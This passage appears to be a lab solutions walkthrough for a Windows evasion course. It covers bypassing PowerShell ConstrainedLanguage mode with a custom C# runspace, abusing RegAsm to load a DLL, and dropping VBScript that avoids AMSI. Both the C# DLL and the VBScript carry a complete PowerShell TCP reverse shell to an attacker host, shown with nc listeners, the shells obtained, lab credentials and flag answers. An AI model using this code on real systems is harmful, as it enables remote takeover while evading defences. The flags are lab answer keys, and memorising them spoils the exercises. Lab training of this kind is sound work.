Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

After waiting for a minute, students will notice that a reverse shell has been successfully established on the `nc` listener as the user `delta`:

```
Ncat: Connection from 10.129.234.143.
Ncat: Connection from 10.129.234.143:58853.
whoami
evasion-target\delta
```

At last, when reading the contents of the file `C:\Users\delta\Desktop\flag.txt`, students will attain the flag `a3b186d9645589bc5ca28dc74cefc668`:

Code: powershell

```powershell
more C:\Users\delta\Desktop\flag.txt
```

```
$ more C:\Users\delta\Desktop\flag.txt

a3b186d9645589bc5ca28dc74cefc668
```

Answer: `a3b186d9645589bc5ca28dc74cefc668`

# PowerShell ContrainedLanguage Mode

## Question 1

### "Develop an EXE file (called CLMBypass.exe) which takes a base64-encoded PowerShell command as an argument, and evaluates it in a custom runspace to bypass ConstrainedLanguage mode. Place this file at "C:\\Alpha\\CLM\\CLMBypass.exe" and wait up to a minute; another user will scan it and verify that it bypasses CLM, and then they will create the file "C:\\Alpha\\CLM\\flag.txt"."

After spawning the target machine of the `Introduction` section, students first need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`, mapping the home folder of `Pwnbox` to a share on 'EVASION-DEV' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.169 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.

[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.169:3389) 
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.169:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to create a `Console App (.NET Framework)` project using Visual Studio 2022 named 'CLMBypass', and then add `System.Management.Automation.dll` as a project reference:

![[HTB Solutions/CAPE/z. images/83db4f61a04caececcd757beb2f8c8bd_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/38dc7520cbbe56303eb70786acf46e3f_MD5.jpg]]

Students then need to develop C# code (as provided in the section) that reads in a base64-encoded PowerShell command as an argument, and evaluates it in a custom runspace to bypass `ConstrainedLanguage` mode, given that default runspaces (such as the ones created by the `RunspaceFactor` class) are created with `FullLanguage` mode:

Code: csharp

```csharp
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CLMBypass
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();

                PowerShell powershell = PowerShell.Create();
                powershell.Runspace = runspace;

                powershell.AddScript(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(args[0])));
                Collection<PSObject> results = powershell.Invoke();
                foreach (PSObject obj in results)
                {
                    Console.WriteLine(obj.ToString());
                }

                runspace.Close();
            }
            catch (Exception ex) { }
        }
    }
}
```

Before building the solution (using the keystrokes `Ctrl + Shift + B`), students should switch to the `Release` solution configuration (rather than `Debug`):

![[HTB Solutions/CAPE/z. images/d3bf78ab0e08935ebc3f2a02d91d93b4_MD5.jpg]]

Afterwards, students need to copy the compiled executable in the `Release` folder to the shared drive on `Pwnbox`:

Code: powershell

```powershell
PS C:\Users\Administrator> copy C:\Tools\CLMBypass\CLMBypass\bin\Release\CLMBypass.exe \\TSCLIENT\SharedDrive
```

```
PS C:\Users\Administrator> PS C:\Users\Administrator> copy C:\Tools\CLMBypass\CLMBypass\bin\Release\CLMBypass.exe \\TSCLIENT\SharedDrive
```

Students then need to launch the target machine in the `PowerShell ConstrainedLanguage Mode` section and connect to it via `xfreerdp`, using the credentials `alpha:FGQxrLW2`, and map the home folder of `Pwnbox` to a share on 'EVASION-TARGET' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-3gf1ygclyw]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.213 /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.

[10:36:50:231] [4972:4973] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[10:36:50:231] [4972:4973] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[10:36:50:231] [4972:4973] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[10:36:50:231] [4972:4973] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[10:36:50:231] [4972:4973] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[10:36:50:231] [4972:4973] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[10:36:50:231] [4972:4973] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[10:36:50:231] [4972:4973] [ERROR][com.freerdp.crypto] - Common Name (CN):
[10:36:50:231] [4972:4973] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[10:36:50:231] [4972:4973] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to copy over the compiled executable from the shared folder on `Pwnbox` to `C:\Alpha\CLM`:

Code: powershell

```powershell
copy \\TSCLIENT\SharedDrive\CLMBypass.exe C:\Alpha\CLM
```

```
PS C:\Users\alpha> copy \\TSCLIENT\SharedDrive\CLMBypass.exe C:\Alpha\CLM
```

After waiting for a minute, students will attain the flag `1ab1e261cea2f1512b28dfe235f2dbbd` when reading the contents of the file `C:\Alpha\CLM\flag.txt`:

Code: powershell

```powershell
more C:\Alpha\CLM\flag.txt
```

```
PS C:\Users\alpha> more C:\Alpha\CLM\flag.txt

1ab1e261cea2f1512b28dfe235f2dbbd
```

Answer: `1ab1e261cea2f1512b28dfe235f2dbbd`

# Skills Assessment I

## Question 1

### "Follow the instructions above. Your goal is to read the flag from the victim's desktop."

After spawning the target machine of the `Introduction` section, students first need to connect to it with `xfreerdp` using the credentials `Administrator:Eva$i0n!`, mapping the home folder of `Pwnbox` to a share on 'EVASION-DEV' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-kp8w8pm5ck]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.169 /u:Administrator /p:'Eva$i0n!' /dynamic-resolution /drive:SharedDrive,.

[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[21:01:15:129] [3777:3778] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:01:16:298] [3777:3778] [WARN][com.freerdp.crypto] - CN = EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.169:3389) 
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - 	EVASION-DEV
[21:01:16:298] [3777:3778] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.169:3389 (RDP-Server):
	Common Name: EVASION-DEV
	Subject:     CN = EVASION-DEV
	Issuer:      CN = EVASION-DEV
	Thumbprint:  60:69:d3:56:9c:ba:ab:fc:43:40:73:01:31:17:fd:f1:8b:7e:3c:c5:64:c6:d9:b5:fa:12:13:30:4d:d5:48:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

When reading the [Execute](https://lolbas-project.github.io/lolbas/Binaries/Regasm/#execute) subsection for [RegAsm](https://lolbas-project.github.io/lolbas/Binaries/Regasm/#execute) in [LOLBAS](https://lolbas-project.github.io/), students will discover that it loads the target `dll` file and executes the `UnRegisterClass` function. Within [T1218.009 - Signed Binary Proxy Execution: Regsvcs/Regasm](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.md#atomic-test-1---regasm-uninstall-method-call-test) in the [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) repository, students will find abuse instructions, provided with with C# [source code](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/src/T1218.009.cs).

Thus, students first need to create a `Console App (.NET Framework)` project using Visual Studio 2022, and then add `System.Management.Automation.dll` and `System.EnterpriseServices.dll` as a project reference:

![[HTB Solutions/CAPE/z. images/9579925bf12ffa6cf1cd0f96b473fdeb_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/e1f862b7811e43eed7b796c408339675_MD5.jpg]]

Regardless that 'RShell' and 'NotMalware' are detected via `YARA` rules, various other approaches can be used; students can develop C# code that executes a PowerShell reverse shell in a custom runspace as an implementation of the 'UnRegisterClass' function, decorated with [ComUnregisterFunctionAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.comunregisterfunctionattribute?view=netframework-4.7.2):

Code: csharp

```csharp
using System;
using System.Collections.ObjectModel;
using System.EnterpriseServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;

namespace SAI
{
    public class Exploit : ServicedComponent
    {
        public Exploit() { Console.WriteLine("Exploit()"); }

        [ComRegisterFunction]
        public static void RegisterClass(string key)
        {
            Console.WriteLine("RegisterClass()");
        }

        [ComUnregisterFunction]
        public static void UnRegisterClass(string key)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            PowerShell powershell = PowerShell.Create();
            powershell.Runspace = runspace;
            powershell.AddScript(@"$ip = ""PWNIP"";
$port = PWNPO;

$tcp = New-Object System.Net.Sockets.TCPClient($ip, $port);
$io = $tcp.GetStream();

[byte[]]$bytes = 0..65535|%{0};

while(($i = $io.Read($bytes, 0, $bytes.Length)) -ne 0) {
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
	$sendback = (Invoke-Expression $data 2>&1 | Out-String );
	$sendback2 = $sendback + '$ ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$io.Write($sendbyte, 0, $sendbyte.Length);
	$io.Flush()
}
$tcp.Close()");
            Collection<PSObject> results = powershell.Invoke();
            runspace.Close();
        }
    }
}
```

Students then need to right-click on the console project and select 'Open Folder in File Explorer':

![[HTB Solutions/CAPE/z. images/10a657126397cbe6edc93122b331b4bf_MD5.jpg]]

Within the project's folder, students need to run PowerShell (`Shift` + `Right-Click` + `Open PowerShell Here`) and use [csc.exe](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/#net-framework-projects) ([LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/Csc/) describes its abuse) to compile the C# source file (named 'Exploit.cs' here) into a `.NET` assembly `dll`, referencing `System.Management.Automation.dll` and `System.EnterpriseServices.dll`:

Code: powershell

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /r:System.EnterpriseServices.dll /out:SAI.dll /target:library Exploit.cs
```

```
PS C:\Tools\SAI\SAI> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /r:System.EnterpriseServices.dll /out:SAI.dll /target:library Exploit.cs

Microsoft (R) Visual C# Compiler version 4.8.4161.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

Afterwards, students need to copy the compiled `dll` file to the shared drive on `Pwnbox`:

Code: powershell

```powershell
copy .\SAI.dll \\TSCLIENT\SharedDrive
```

```
PS C:\Tools\SAI\SAI> copy .\SAI.dll \\TSCLIENT\SharedDrive
```

Students then need to launch the target machine in the `Skills Assessment I` section and connect to it via `xfreerdp`, using the credentials `alpha:FGQxrLW2`, and map the home folder of `Pwnbox` to a share on 'EVASION-TARGET' (named 'SharedDrive' here):

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-vkwctcnhnq]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.213 /u:alpha /p:FGQxrLW2 /dynamic-resolution /drive:SharedDrive,.

[16:57:38:664] [7433:7434] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:57:38:665] [7433:7434] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[16:57:38:665] [7433:7434] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:57:38:665] [7433:7434] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[16:57:38:665] [7433:7434] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:57:38:665] [7433:7434] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.213:3389) 
[16:57:38:665] [7433:7434] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[16:57:38:665] [7433:7434] [ERROR][com.freerdp.crypto] - Common Name (CN):
[16:57:38:665] [7433:7434] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[16:57:38:665] [7433:7434] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.213:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Subsequently, students need to copy over the compiled `dll` file from the shared folder on `Pwnbox` to `C:\Alpha\SA1`:

Code: powershell

```powershell
copy \\TSCLIENT\SharedDrive\SAI.dll C:\Alpha\SA1
```

```
PS C:\Users\alpha> copy \\TSCLIENT\SharedDrive\SAI.dll C:\Alpha\SA1
```

Afterward, students need to start an `nc` listener on the same `PWNPO` hardcoded in the compiled `dll`:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-vkwctcnhnq]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

After waiting for a minute, students will notice that a reverse shell has been successfully established on the `nc` listener as the user `zeta`:

```
Ncat: Connection from 10.129.229.213.
Ncat: Connection from 10.129.229.213:62404.
whoami
evasion-target\zeta
```

At last, when reading the contents of the file `C:\Users\Zeta\Desktop\flag.txt`, students will attain the flag `cc2576956e4992ebb7891dac76e04cbf`:

Code: powershell

```powershell
more C:\Users\Zeta\Desktop\flag.txt
```

```
$ more C:\Users\Zeta\Desktop\flag.txt

cc2576956e4992ebb7891dac76e04cbf
```

Answer: `cc2576956e4992ebb7891dac76e04cbf`

# Skills Assessment II

## Question 1

### "Follow the instructions above. Your goal is to read the flag from the victim's desktop."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `alpha:FGQxrLW2`:

Code: shell

```shell
xfreerdp /v:STMIP /u:alpha /p:FGQxrLW2 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-vkwctcnhnq]─[~]
└──╼ [★]$ xfreerdp /v:10.129.2.53 /u:alpha /p:FGQxrLW2 /dynamic-resolution

[17:16:56:275] [8938:8939] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[17:16:56:275] [8938:8939] [WARN][com.freerdp.crypto] - CN = EVASION-TARGET
[17:16:56:275] [8938:8939] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[17:16:56:275] [8938:8939] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[17:16:56:275] [8938:8939] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[17:16:56:275] [8938:8939] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.2.53:3389) 
[17:16:56:275] [8938:8939] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[17:16:56:275] [8938:8939] [ERROR][com.freerdp.crypto] - Common Name (CN):
[17:16:56:275] [8938:8939] [ERROR][com.freerdp.crypto] - 	EVASION-TARGET
[17:16:56:275] [8938:8939] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.2.53:3389 (RDP-Server):
	Common Name: EVASION-TARGET
	Subject:     CN = EVASION-TARGET
	Issuer:      CN = EVASION-TARGET
	Thumbprint:  c9:b7:9f:fe:76:d9:43:94:6e:5c:68:7d:40:93:83:ea:a2:0d:c0:7c:f4:94:73:9c:e7:51:49:24:cc:df:c2:f8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

Various approaches can be used. Students can develop `VBScript` code that utilizes the [FileSystemObject](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object) object to write a PowerShell reverse shell payload file to `C:\Alpha\SA2` (making sure to not to use syntax that triggers `AMSI`) and then execute it with PowerShell using the `Exec` method of `WScript.Shell`:

Code: vb

```vb
Set objFSO = CreateObject("Scripting.FileSystemObject")
outFile="C:\Alpha\SA2\ReverseShell.ps1"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.Write "$ip = 'PWNIP';$port = PWNPO;$tcp = New-Object System.Net.Sockets.TCPClient($ip, $port);$io = $tcp.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $io.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (Invoke-Expression $data 2>&1 | Out-String );$sendback2 = $sendback + '$ ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$io.Write($sendbyte, 0, $sendbyte.Length);$io.Flush();};$tcp.Close();" & vbCrLf
objFile.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Exec("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Alpha\SA2\ReverseShell.ps1")
```

After saving the `VBScript` payload file in `C:\Alpha\SA2`, students then need to start an `nc` listener on the same `PWNPO` used in it:

```shell
nc -nvlp PWNPO
```
```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-vkwctcnhnq]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

After waiting for a minute, students will notice that a reverse shell has been successfully established on the `nc` listener as the user `eta`:

```
Ncat: Connection from 10.129.2.53.
Ncat: Connection from 10.129.2.53:64871.
whoami
evasion-target\eta
```

At last, when reading the contents of the file `C:\Users\eta\Desktop\flag.txt`, students will attain the flag `a354cb848380f9da5dcfa6852c81276f`:

```powershell
more C:\Users\eta\Desktop\flag.txt
```
```
$ more C:\Users\eta\Desktop\flag.txt

a354cb848380f9da5dcfa6852c81276f
```

Answer: `a354cb848380f9da5dcfa6852c81276f`